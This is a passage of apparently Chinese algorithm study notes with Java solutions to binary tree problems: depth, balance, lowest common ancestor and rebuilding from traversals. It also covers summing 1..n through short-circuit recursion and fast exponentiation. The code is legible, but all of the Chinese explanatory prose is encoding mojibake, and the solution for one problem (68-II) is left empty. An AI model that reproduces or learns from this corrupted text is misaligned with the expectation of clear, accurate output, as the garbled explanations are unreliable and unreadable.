O(logâ¡N) æ—¶é—´ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š** å…¶ä¸­ N ä¸ºæ•°æ®æµä¸­çš„å…ƒç´ æ•°é‡ï¼Œå°é¡¶å † A å’Œå¤§é¡¶å † B æœ€å¤šåŒæ—¶ä¿å­˜ N ä¸ªå…ƒç´ ã€‚\n\n# ç¬¬ 18 å¤© æœç´¢ä¸å›æº¯ç®—æ³•ï¼ˆä¸­ç­‰ï¼‰ \n\n## 55 - I. äºŒå‰æ ‘çš„æ·±åº¦\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸€æ£µäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œæ±‚è¯¥æ ‘çš„æ·±åº¦ã€‚ä»æ ¹èŠ‚ç‚¹åˆ°å¶èŠ‚ç‚¹ä¾æ¬¡ç»è¿‡çš„èŠ‚ç‚¹ï¼ˆå«æ ¹ã€å¶èŠ‚ç‚¹ï¼‰å½¢æˆæ ‘çš„ä¸€æ¡è·¯å¾„ï¼Œæœ€é•¿è·¯å¾„çš„é•¿åº¦ä¸ºæ ‘çš„æ·±åº¦ã€‚\n>\n>ä¾‹å¦‚ï¼š\n>\n>ç»™å®šäºŒå‰æ ‘ [3,9,20,null,null,15,7]ï¼Œ\n>\n>        3\n>       / \\\n>      9  20\n>        /  \\\n>       15   7\n>\n>è¿”å›å®ƒçš„æœ€å¤§æ·±åº¦ 3 ã€‚\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202208291551122.png)\n\n```java\nclass Solution {\n    public int maxDepth(TreeNode root) {\n        if(root == null) return 0;\n        return Math.max(maxDepth(root.left), maxDepth(root.right)) + 1;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** N ä¸ºæ ‘çš„èŠ‚ç‚¹æ•°é‡ï¼Œè®¡ç®—æ ‘çš„æ·±åº¦éœ€è¦éå†æ‰€æœ‰èŠ‚ç‚¹ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N)ï¼š** æœ€å·®æƒ…å†µä¸‹ï¼ˆå½“æ ‘é€€åŒ–ä¸ºé“¾è¡¨æ—¶ï¼‰ï¼Œé€’å½’æ·±åº¦å¯è¾¾åˆ° N ã€‚\n\n## 55 - II. å¹³è¡¡äºŒå‰æ ‘\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸€æ£µäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œåˆ¤æ–­è¯¥æ ‘æ˜¯ä¸æ˜¯å¹³è¡¡äºŒå‰æ ‘ã€‚å¦‚æœæŸäºŒå‰æ ‘ä¸­ä»»æ„èŠ‚ç‚¹çš„å·¦å³å­æ ‘çš„æ·±åº¦ç›¸å·®ä¸è¶…è¿‡1ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯ä¸€æ£µå¹³è¡¡äºŒå‰æ ‘ã€‚\n>\n>ç¤ºä¾‹ 1:\n>\n>ç»™å®šäºŒå‰æ ‘ [3,9,20,null,null,15,7]\n>\n>```\n>   3\n>  / \\\n> 9  20\n>   /  \\\n>  15   7\n>```\n>\n>è¿”å› true ã€‚\n>\n>ç¤ºä¾‹ 2:\n>\n>ç»™å®šäºŒå‰æ ‘ [1,2,2,3,3,null,null,4,4]\n>\n>          1\n>         / \\\n>        2   2\n>       / \\\n>      3   3\n>     / \\\n>    4   4\n>è¿”å› false ã€‚\n\n### è§£ç­”\n\n```java\nclass Solution {\n    public boolean isBalanced(TreeNode root) {\n        if (root == null) return true;\n        return Math.abs(depth(root.left) - depth(root.right)) <= 1 && isBalanced(root.left) && isBalanced(root.right);\n    }\n\n    private int depth(TreeNode root) {\n        if (root == null) return 0;\n        return Math.max(depth(root.left), depth(root.right)) + 1;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n- **æ—¶é—´å¤æ‚åº¦ O(NlogN)ï¼š**æœ€å·®æƒ…å†µä¸‹ï¼ˆä¸º â€œæ»¡äºŒå‰æ ‘â€ æ—¶ï¼‰ï¼Œæ»¡äºŒå‰æ ‘é«˜åº¦çš„å¤æ‚åº¦ O(logN)ï¼Œå„å±‚æ‰§è¡Œ `depth(root)` çš„æ—¶é—´å¤æ‚åº¦ä¸º O(N)ï¼Œæ€»ä½“æ—¶é—´å¤æ‚åº¦ == æ¯å±‚æ‰§è¡Œå¤æ‚åº¦ Ã— å±‚æ•°å¤æ‚åº¦ = O(NÃ—logN) ã€‚\n\n- **ç©ºé—´å¤æ‚åº¦ O(N)ï¼š** æœ€å·®æƒ…å†µä¸‹ï¼ˆæ ‘é€€åŒ–ä¸ºé“¾è¡¨æ—¶ï¼‰ï¼Œç³»ç»Ÿé€’å½’éœ€è¦ä½¿ç”¨ O(N) çš„æ ˆç©ºé—´ã€‚\n\n# ç¬¬ 19 å¤© æœç´¢ä¸å›æº¯ç®—æ³•ï¼ˆä¸­ç­‰ï¼‰\n\n## 64. æ±‚1+2+â€¦+n\n\n### é¢˜ç›®\n\n>æ±‚ 1+2+...+n ï¼Œè¦æ±‚ä¸èƒ½ä½¿ç”¨ä¹˜é™¤æ³•ã€forã€whileã€ifã€elseã€switchã€caseç­‰å…³é”®å­—åŠæ¡ä»¶åˆ¤æ–­è¯­å¥ï¼ˆA?B:Cï¼‰ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥: n = 3\n>è¾“å‡º: 6\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥: n = 9\n>è¾“å‡º: 45\n>```\n\n### è§£ç­”\n\n1+2+...+(nâˆ’1)+n çš„è®¡ç®—æ–¹æ³•ä¸»è¦æœ‰ä¸‰ç§ï¼šå¹³å‡è®¡ç®—ã€è¿­ä»£ã€é€’å½’ã€‚\n\n- å¹³å‡è®¡ç®—ï¼š(1 + n) * n / 2ï¼›æ­¤è®¡ç®—å¿…é¡»ä½¿ç”¨ **ä¹˜é™¤æ³•** ï¼Œå› æ­¤æœ¬æ–¹æ³•ä¸å¯å–ï¼Œç›´æ¥æ’é™¤ã€‚\n\n```java\npublic int sumNums(int n) {\n    return (1 + n) * n / 2;\n}\n```\n\n- è¿­ä»£ï¼šå¾ªç¯å¿…é¡»ä½¿ç”¨ while æˆ– forï¼Œå› æ­¤æœ¬æ–¹æ³•ä¸å¯å–ï¼Œç›´æ¥æ’é™¤ã€‚\n\n```java\npublic int sumNums(int n) {\n    int res = 0;\n    for(int i = 1; i <= n; i++)\n        res += i;\n    return res;\n}\n```\n\n- é€’å½’ï¼šç»ˆæ­¢æ¡ä»¶éœ€è¦ä½¿ç”¨ if ï¼Œå› æ­¤æœ¬æ–¹æ³•ä¸å¯å–ã€‚\n\n```java\npublic int sumNums(int n) {\n    if(n == 0) return 0;\n    n += sumNums(n - 1);\n    return n;\n}\n```\n\n- æ­£ç¡®è§£ç­”ï¼šä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦çš„çŸ­è·¯æ•ˆåº”æ¥ç»ˆæ­¢é€’å½’\n\nå¸¸è§çš„é€»è¾‘è¿ç®—ç¬¦æœ‰ä¸‰ç§ï¼Œå³ â€œä¸ && â€ï¼Œâ€œæˆ– || â€ï¼Œâ€œé ! â€ ï¼›è€Œå…¶æœ‰é‡è¦çš„çŸ­è·¯æ•ˆåº”\n\n```java\nif(A && B)  // è‹¥ A ä¸º false ï¼Œåˆ™ B çš„åˆ¤æ–­ä¸ä¼šæ‰§è¡Œï¼ˆå³çŸ­è·¯ï¼‰ï¼Œç›´æ¥åˆ¤å®š A && B ä¸º false\n\nif(A || B) // è‹¥ A ä¸º true ï¼Œåˆ™ B çš„åˆ¤æ–­ä¸ä¼šæ‰§è¡Œï¼ˆå³çŸ­è·¯ï¼‰ï¼Œç›´æ¥åˆ¤å®š A || B ä¸º true\n```\n\næœ¬é¢˜éœ€è¦å®ç° â€œå½“ n\\=1 æ—¶ç»ˆæ­¢é€’å½’â€ çš„éœ€æ±‚ï¼Œå¯é€šè¿‡çŸ­è·¯æ•ˆåº”å®ç°ã€‚\n\n```java\nn > 0 && n += sumNums(n - 1) // å½“ n = 0 æ—¶ n > 0 ä¸æˆç«‹ ï¼Œæ­¤æ—¶ â€œçŸ­è·¯â€ ï¼Œç»ˆæ­¢åç»­é€’å½’\n```\n\n```java\nclass Solution {\n    public int sumNums(int n) {\n        boolean flag = n > 0 && (n += sumNums(n - 1)) > 0;\n        return n;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(n) ï¼š** è®¡ç®— n+(nâˆ’1)+...+2+1 éœ€è¦å¼€å¯ n ä¸ªé€’å½’å‡½æ•°ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(n) ï¼š** é€’å½’æ·±åº¦è¾¾åˆ° n ï¼Œç³»ç»Ÿä½¿ç”¨ O(n) å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n## 68 - I. äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ\n\n### é¢˜ç›®\n\n>ç»™å®šä¸€ä¸ªäºŒå‰æœç´¢æ ‘, æ‰¾åˆ°è¯¥æ ‘ä¸­ä¸¤ä¸ªæŒ‡å®šèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆã€‚\n>\n>ç™¾åº¦ç™¾ç§‘ä¸­æœ€è¿‘å…¬å…±ç¥–å…ˆçš„å®šä¹‰ä¸ºï¼šâ€œå¯¹äºæœ‰æ ¹æ ‘ T çš„ä¸¤ä¸ªç»“ç‚¹ pã€qï¼Œæœ€è¿‘å…¬å…±ç¥–å…ˆè¡¨ç¤ºä¸ºä¸€ä¸ªç»“ç‚¹ xï¼Œæ»¡è¶³ x æ˜¯ pã€q çš„ç¥–å…ˆä¸” x çš„æ·±åº¦å°½å¯èƒ½å¤§ï¼ˆä¸€ä¸ªèŠ‚ç‚¹ä¹Ÿå¯ä»¥æ˜¯å®ƒè‡ªå·±çš„ç¥–å…ˆï¼‰ã€‚â€\n>\n>ä¾‹å¦‚ï¼Œç»™å®šå¦‚ä¸‹äºŒå‰æœç´¢æ ‘:  root = [6,2,8,0,4,7,9,null,null,3,5]\n>\n>![](https://img.jwt1399.top/img/202208301248898.png)\n>\n>ç¤ºä¾‹ 1:\n>\n>```\n>è¾“å…¥: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8\n>è¾“å‡º: 6 \n>è§£é‡Š: èŠ‚ç‚¹ 2 å’ŒèŠ‚ç‚¹ 8 çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯ 6ã€‚\n>```\n>\n>ç¤ºä¾‹ 2:\n>\n>```\n>è¾“å…¥: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4\n>è¾“å‡º: 2\n>è§£é‡Š: èŠ‚ç‚¹ 2 å’ŒèŠ‚ç‚¹ 4 çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯ 2, å› ä¸ºæ ¹æ®å®šä¹‰æœ€è¿‘å…¬å…±ç¥–å…ˆèŠ‚ç‚¹å¯ä»¥ä¸ºèŠ‚ç‚¹æœ¬èº«ã€‚\n>```\n\n### è§£ç­”\n\n#### æ–¹æ³•1ï¼šè¿­ä»£\n\n**æœ€è¿‘å…¬å…±ç¥–å…ˆçš„å®šä¹‰ï¼š** è®¾èŠ‚ç‚¹ root ä¸ºèŠ‚ç‚¹ p,q çš„æŸå…¬å…±ç¥–å…ˆï¼Œè‹¥å…¶å·¦å­èŠ‚ç‚¹ root.left å’Œå³å­èŠ‚ç‚¹ root.right éƒ½ä¸æ˜¯ p,q çš„å…¬å…±ç¥–å…ˆï¼Œåˆ™ç§° root æ˜¯ â€œæœ€è¿‘çš„å…¬å…±ç¥–å…ˆâ€ ã€‚\n\n-   **å¾ªç¯æœç´¢ï¼š** å½“èŠ‚ç‚¹ root ä¸ºç©ºæ—¶è·³å‡ºï¼›\n    1.  å½“ p,q éƒ½åœ¨ root çš„ **å³å­æ ‘** ä¸­ï¼Œåˆ™éå†è‡³ root.right ï¼›\n    2.  å¦åˆ™ï¼Œå½“ p,q éƒ½åœ¨ root çš„ **å·¦å­æ ‘** ä¸­ï¼Œåˆ™éå†è‡³ root.left ï¼›\n    3.  å¦åˆ™ï¼Œè¯´æ˜æ‰¾åˆ°äº† **æœ€è¿‘å…¬å…±ç¥–å…ˆ** ï¼Œè·³å‡ºã€‚\n-   **è¿”å›å€¼ï¼š** æœ€è¿‘å…¬å…±ç¥–å…ˆ root ã€‚\n\næœ¬é¢˜ç»™å®šäº†ä¸¤ä¸ªé‡è¦æ¡ä»¶ï¼šâ‘  æ ‘ä¸º **äºŒå‰æœç´¢æ ‘** ï¼Œâ‘¡ æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹çš„å€¼éƒ½æ˜¯ **å”¯ä¸€** çš„ã€‚æ ¹æ®ä»¥ä¸Šæ¡ä»¶ï¼Œå¯æ–¹ä¾¿åœ°åˆ¤æ–­ p,q ä¸ root çš„å­æ ‘å…³ç³»ï¼Œå³ï¼š\n\n-   è‹¥ root.val<p.val ï¼Œåˆ™ p åœ¨ root **å³å­æ ‘** ä¸­ï¼›\n-   è‹¥ root.val\\>p.val ï¼Œåˆ™ p åœ¨ root **å·¦å­æ ‘** ä¸­ï¼›\n-   è‹¥ root.val\\=p.val ï¼Œåˆ™ p å’Œ root æŒ‡å‘ **åŒä¸€èŠ‚ç‚¹** \n\n```java\nclass Solution {\n    public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) {\n        while(root != null) {\n            if(root.val < p.val && root.val < q.val) // p,q éƒ½åœ¨ root çš„å³å­æ ‘ä¸­\n                root = root.right; // éå†è‡³å³å­èŠ‚ç‚¹\n            else if(root.val > p.val && root.val > q.val) // p,q éƒ½åœ¨ root çš„å·¦å­æ ‘ä¸­\n                root = root.left; // éå†è‡³å·¦å­èŠ‚ç‚¹\n            else break;\n        }\n        return root;\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼šé€’å½’\n\n```java\nclass Solution {\n    public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) {\n        if(root.val < p.val && root.val < q.val)\n            return lowestCommonAncestor(root.right, p, q);\n        if(root.val > p.val && root.val > q.val)\n            return lowestCommonAncestor(root.left, p, q);\n        return root;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n#### æ–¹æ³•1\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N)ï¼š** å…¶ä¸­ N ä¸ºäºŒå‰æ ‘èŠ‚ç‚¹æ•°ï¼›æ¯å¾ªç¯ä¸€è½®æ’é™¤ä¸€å±‚ï¼ŒäºŒå‰æœç´¢æ ‘çš„å±‚æ•°æœ€å°ä¸º logâ¡N ï¼ˆæ»¡äºŒå‰æ ‘ï¼‰ï¼Œæœ€å¤§ä¸º N ï¼ˆé€€åŒ–ä¸ºé“¾è¡¨ï¼‰ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1)ï¼š** ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n#### æ–¹æ³•2\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N)ï¼š** å…¶ä¸­ N ä¸ºäºŒå‰æ ‘èŠ‚ç‚¹æ•°ï¼›æ¯å¾ªç¯ä¸€è½®æ’é™¤ä¸€å±‚ï¼ŒäºŒå‰æœç´¢æ ‘çš„å±‚æ•°æœ€å°ä¸º logâ¡N ï¼ˆæ»¡äºŒå‰æ ‘ï¼‰ï¼Œæœ€å¤§ä¸º N ï¼ˆé€€åŒ–ä¸ºé“¾è¡¨ï¼‰ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N)ï¼š** æœ€å·®æƒ…å†µä¸‹ï¼Œå³æ ‘é€€åŒ–ä¸ºé“¾è¡¨æ—¶ï¼Œé€’å½’æ·±åº¦è¾¾åˆ°æ ‘çš„å±‚æ•° N ã€‚\n\n## 68 - II. äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ\n\n### é¢˜ç›®\n\n>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘, æ‰¾åˆ°è¯¥æ ‘ä¸­ä¸¤ä¸ªæŒ‡å®šèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆã€‚\n>\n>ç™¾åº¦ç™¾ç§‘ä¸­æœ€è¿‘å…¬å…±ç¥–å…ˆçš„å®šä¹‰ä¸ºï¼šâ€œå¯¹äºæœ‰æ ¹æ ‘ T çš„ä¸¤ä¸ªç»“ç‚¹ pã€qï¼Œæœ€è¿‘å…¬å…±ç¥–å…ˆè¡¨ç¤ºä¸ºä¸€ä¸ªç»“ç‚¹ xï¼Œæ»¡è¶³ x æ˜¯ pã€q çš„ç¥–å…ˆä¸” x çš„æ·±åº¦å°½å¯èƒ½å¤§ï¼ˆä¸€ä¸ªèŠ‚ç‚¹ä¹Ÿå¯ä»¥æ˜¯å®ƒè‡ªå·±çš„ç¥–å…ˆï¼‰ã€‚â€\n>\n>ä¾‹å¦‚ï¼Œç»™å®šå¦‚ä¸‹äºŒå‰æ ‘:  root = [3,5,1,6,2,0,8,null,null,7,4]\n>\n>![](https://img.jwt1399.top/img/202208301726689.png)\n>\n>ç¤ºä¾‹ 1:\n>\n>```\n>è¾“å…¥: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1\n>è¾“å‡º: 3\n>è§£é‡Š: èŠ‚ç‚¹ 5 å’ŒèŠ‚ç‚¹ 1 çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯èŠ‚ç‚¹ 3ã€‚\n>```\n>\n>ç¤ºä¾‹ 2:\n>\n>```\n>è¾“å…¥: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4\n>è¾“å‡º: 5\n>è§£é‡Š: èŠ‚ç‚¹ 5 å’ŒèŠ‚ç‚¹ 4 çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯èŠ‚ç‚¹ 5ã€‚å› ä¸ºæ ¹æ®å®šä¹‰æœ€è¿‘å…¬å…±ç¥–å…ˆèŠ‚ç‚¹å¯ä»¥ä¸ºèŠ‚ç‚¹æœ¬èº«ã€‚\n>```\n\n### è§£ç­”\n\n```java\n\n```\n\n### å¤æ‚åº¦\n\n# ç¬¬ 20 å¤© åˆ†æ²»ç®—æ³•ï¼ˆä¸­ç­‰ï¼‰\n\n## 07. é‡å»ºäºŒå‰æ ‘\n\n### é¢˜ç›®\n\n>è¾“å…¥æŸäºŒå‰æ ‘çš„å‰åºéå†å’Œä¸­åºéå†çš„ç»“æœï¼Œè¯·æ„å»ºè¯¥äºŒå‰æ ‘å¹¶è¿”å›å…¶æ ¹èŠ‚ç‚¹ã€‚\n>\n>å‡è®¾è¾“å…¥çš„å‰åºéå†å’Œä¸­åºéå†çš„ç»“æœä¸­éƒ½ä¸å«é‡å¤çš„æ•°å­—ã€‚\n>\n>ç¤ºä¾‹ 1:\n>\n>![](https://img.jwt1399.top/img/202208311403683.jpg)\n>\n>```\n>Input: preorder = [3,9,20,15,7], inorder = [9,3,15,20,7]\n>Output: [3,9,20,null,null,15,7]\n>```\n>\n>\n>ç¤ºä¾‹ 2:\n>\n>```\n>Input: preorder = [-1], inorder = [-1]\n>Output: [-1]\n>```\n\n### è§£ç­”\n\nå‰åºéå†æ€§è´¨ï¼š èŠ‚ç‚¹æŒ‰ç…§ `[ æ ¹èŠ‚ç‚¹ | å·¦å­æ ‘ | å³å­æ ‘ ]` æ’åºã€‚\nä¸­åºéå†æ€§è´¨ï¼š èŠ‚ç‚¹æŒ‰ç…§ `[ å·¦å­æ ‘ | æ ¹èŠ‚ç‚¹ | å³å­æ ‘ ]` æ’åºã€‚\n\n![](https://img.jwt1399.top/img/202208311418630.png)\n\n**é€’æ¨å‚æ•°ï¼š** æ ¹èŠ‚ç‚¹åœ¨å‰åºéå†çš„ç´¢å¼• `pre_root` ã€å­æ ‘åœ¨ä¸­åºéå†çš„å·¦è¾¹ç•Œ `in_left` ã€å­æ ‘åœ¨ä¸­åºéå†çš„å³è¾¹ç•Œ `in_right` ï¼›æ ¹èŠ‚ç‚¹åœ¨ä¸­åºéå† `inorder` ä¸­çš„ç´¢å¼• `i` \n\n|            | æ ¹èŠ‚ç‚¹ç´¢å¼•                   | ä¸­åºéå†å·¦è¾¹ç•Œ | ä¸­åºéå†å³è¾¹ç•Œ |\n| ---------- | ---------------------------- | -------------- | -------------- |\n| **å·¦å­æ ‘** | `pre_root + 1`               | `in_left`      | `i - 1`        |\n| **å³å­æ ‘** | `pre_root + i - in_left + 1` | `i + 1`        | `in_right`     |\n\n> **TIPSï¼š** `pre_root + i - in_left + 1`å«ä¹‰ä¸º `æ ¹èŠ‚ç‚¹ç´¢å¼• + å·¦å­æ ‘é•¿åº¦ + 1`\n\n```java\nclass Solution {\n    int[] preorder;//ä¿ç•™çš„å…ˆåºéå†ï¼Œæ–¹ä¾¿é€’å½’æ—¶ä¾æ®ç´¢å¼•æŸ¥çœ‹å…ˆåºéå†çš„å€¼\n    HashMap<Integer, Integer> dic = new HashMap<>();//å­˜å‚¨ä¸­åºéå†çš„å€¼ä¸ç´¢å¼•\n    public TreeNode buildTree(int[] preorder, int[] inorder) {\n        this.preorder = preorder;\n        //å°†ä¸­åºéå†çš„å€¼åŠç´¢å¼•æ”¾åœ¨mapä¸­ï¼Œæ–¹ä¾¿é€’å½’æ—¶è·å–å·¦å­æ ‘ä¸å³å­æ ‘çš„æ•°é‡åŠå…¶æ ¹çš„ç´¢å¼•\n        for(int i = 0; i < inorder.length; i++)\n            dic.put(inorder[i], i);\n        return recur(0, 0, inorder.length - 1);//recur(å½“å‰æ ¹çš„çš„ç´¢å¼•,å­æ ‘å·¦è¾¹ç•Œ,å­æ ‘å³è¾¹ç•Œ)\n    }\n    TreeNode recur(int pre_root, int in_left, int in_right) {\n        if(in_left > in_right) return null;                        // é€’å½’ç»ˆæ­¢\n        TreeNode root = new TreeNode(preorder[pre_root]);          // å»ºç«‹æ ¹èŠ‚ç‚¹\n        int i = dic.get(preorder[pre_root]);                       // åˆ’åˆ†æ ¹èŠ‚ç‚¹ã€å·¦å­æ ‘ã€å³å­æ ‘\n        //å·¦å­æ ‘çš„æ ¹çš„ç´¢å¼•ä¸ºå…ˆåºä¸­çš„æ ¹èŠ‚ç‚¹+1 \n        //å·¦å­æ ‘çš„å·¦è¾¹ç•Œä¸ºåŸæ¥çš„ä¸­åºin_left\n        //å·¦å­æ ‘çš„å³è¾¹ç•Œä¸ºä¸­åºä¸­çš„æ ¹èŠ‚ç‚¹ç´¢å¼•-1\n        root.left = recur(pre_root + 1, in_left, i - 1);           // å¼€å¯å·¦å­æ ‘é€’å½’\n        //å³å­æ ‘çš„æ ¹çš„ç´¢å¼•ä¸ºå…ˆåºä¸­çš„å½“å‰æ ¹ä½ç½® + å·¦å­æ ‘çš„é•¿åº¦ + 1\n        //å³å­æ ‘çš„å·¦è¾¹ç•Œä¸ºä¸­åºä¸­å½“å‰æ ¹èŠ‚ç‚¹+1\n        //å³å­æ ‘çš„å³è¾¹ç•Œä¸ºä¸­åºä¸­åŸæ¥å³å­æ ‘çš„è¾¹ç•Œ\n        root.right = recur(pre_root + i - in_left + 1, i + 1, in_right); // å¼€å¯å³å­æ ‘é€’å½’\n        return root;                                           // å›æº¯è¿”å›æ ¹èŠ‚ç‚¹\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** å…¶ä¸­ N ä¸ºæ ‘çš„èŠ‚ç‚¹æ•°é‡ã€‚åˆå§‹åŒ– HashMap éœ€éå† `inorder` ï¼Œå ç”¨ O(N)ã€‚é€’å½’å…±å»ºç«‹ N ä¸ªèŠ‚ç‚¹ï¼Œæ¯å±‚é€’å½’ä¸­çš„èŠ‚ç‚¹å»ºç«‹ã€æœç´¢æ“ä½œå ç”¨ O(1)ï¼Œå› æ­¤ä½¿ç”¨ O(N)æ—¶é—´ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š** HashMap ä½¿ç”¨ O(N) é¢å¤–ç©ºé—´ï¼›æœ€å·®æƒ…å†µä¸‹ï¼ˆè¾“å…¥äºŒå‰æ ‘ä¸ºé“¾è¡¨æ—¶ï¼‰ï¼Œé€’å½’æ·±åº¦è¾¾åˆ° N ï¼Œå ç”¨ O(N) çš„æ ˆå¸§ç©ºé—´ï¼›å› æ­¤æ€»å…±ä½¿ç”¨ O(N) ç©ºé—´ã€‚\n\n## 16. æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹\n\n### é¢˜ç›®\n\n>å®ç° pow(x, n) ï¼Œå³è®¡ç®— x çš„ n æ¬¡å¹‚å‡½æ•°ï¼ˆå³ï¼Œx<sup>n</sup>ï¼‰ã€‚ä¸å¾—ä½¿ç”¨åº“å‡½æ•°ï¼ŒåŒæ—¶ä¸éœ€è¦è€ƒè™‘å¤§æ•°é—®é¢˜ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼šx = 2.00000, n = 10\n>è¾“å‡ºï¼š1024.00000\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼šx = 2.10000, n = 3\n>è¾“å‡ºï¼š9.26100\n>```\n>\n>ç¤ºä¾‹ 3ï¼š\n>\n>```\n>è¾“å…¥ï¼šx = 2.00000, n = -2\n>è¾“å‡ºï¼š0.25000\n>è§£é‡Šï¼š2-2 = 1/22 = 1/4 = 0.25\n>```\n\n### è§£ç­”\n\n-   å¯¹äºä»»ä½•åè¿›åˆ¶æ­£æ•´æ•° n ï¼Œè®¾å…¶äºŒè¿›åˆ¶ä¸º \"b<sub>m</sub>...b<sub>3</sub>b<sub>2</sub>b<sub>1</sub>\"\n-   n = 1b<sub>1</sub> + 2b<sub>2</sub> + 4b<sub>3</sub> + ... + 2<sup>mâˆ’1</sup>b<sub>m</sub>\n-   x<sup>n</sup> = x<sup>1b<sub>1</sub> + 2b<sub>2</sub> + 4b<sup>3</sup> + ... + 2<sup>mâˆ’1</sup>b<sub>m</sub></sup> = x<sup>1b<sub>1</sub></sup>x<sup>2b<sub>2</sub></sup>x<sup>4b<sup>3</sup></sup>...x<sup>2<sup>mâˆ’1</sup>b<sub>m</sub></sup>\n\næ ¹æ®ä»¥ä¸Šæ¨å¯¼ï¼Œå¯æŠŠè®¡ç®— x<sup>n</sup> è½¬åŒ–ä¸ºè§£å†³ä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š\n\n-   **è®¡ç®— x<sup>1</sup>,x<sup>2</sup>,x<sup>4</sup>,...,x<sup>2mâˆ’1</sup>çš„å€¼ï¼š** å¾ªç¯èµ‹å€¼æ“ä½œ x = x<sup>2</sup> å³å¯ï¼›\n-   **è·å–äºŒè¿›åˆ¶å„ä½ b<sub>1</sub>,b<sub>2</sub>,b<sub>3</sub>,...,b<sub>m</sub> çš„å€¼ï¼š** å¾ªç¯æ‰§è¡Œä»¥ä¸‹æ“ä½œå³å¯ã€‚\n    1.  **n&1 ï¼ˆä¸æ“ä½œï¼‰ï¼š** åˆ¤æ–­ n äºŒè¿›åˆ¶æœ€å³ä¸€ä½æ˜¯å¦ä¸º 1 ï¼›\n    2.  **n>>1 ï¼ˆç§»ä½æ“ä½œï¼‰ï¼š** n å³ç§»ä¸€ä½ï¼ˆå¯ç†è§£ä¸ºåˆ é™¤æœ€åä¸€ä½ï¼‰ã€‚\n\n> Java ä»£ç ä¸­ `int32` å˜é‡ nâˆˆ\\[âˆ’2147483648,2147483647]ï¼Œå› æ­¤å½“ n\\=âˆ’2147483648 æ—¶æ‰§è¡Œ n \\= âˆ’n ä¼šå› è¶Šç•Œè€Œèµ‹å€¼å‡ºé”™ã€‚è§£å†³æ–¹æ³•æ˜¯å…ˆå°† n å­˜å…¥ `long` å˜é‡ b ï¼Œåé¢ç”¨ b æ“ä½œå³å¯ã€‚\n\n```java\nclass Solution {\n    public double myPow(double x, int n) {\n        if(x == 0) return 0;\n        long b = n;\n        double res = 1.0;\n        if(b < 0) {\n            x = 1 / x;\n            b = -b;\n        }\n        while(b > 0) {\n            if((b & 1) == 1) res *= x;\n            x *= x;\n            b >>= 1;\n        }\n        return res;\n    }\n}\n```\n\n-   å¦‚æœ n ä¸ºå¶æ•°ï¼š x<sup>n</sup> =  x<sup>n/2</sup> * x<sup>n/2</sup>* x<sup>n%2</sup>\n-   å¦‚æœ n ä¸ºå¥‡æ•°ï¼š x<sup>n</sup> =  x<sup>n/2</sup> * x<sup>n/2</sup> * x<sup>n%2</sup>\n\n```java\nclass Solution {\n    public double myPow(double x, int n) {\n        if(n == 0) return 1;\n        if(n == 1) return x;\n        if(n == -1) return 1 / x;\n        double half = myPow(x, n / 2);\n        double mod = myPow(x, n % 2);\n        return half * half * mod;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(log<sub>2</sub>n)ï¼š** äºŒåˆ†çš„æ—¶é—´å¤æ‚åº¦ä¸ºå¯¹æ•°çº§åˆ«ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** res, b ç­‰å˜é‡å ç”¨å¸¸æ•°å¤§å°é¢å¤–ç©ºé—´ã€‚\n\n## 33. äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—\n\n### 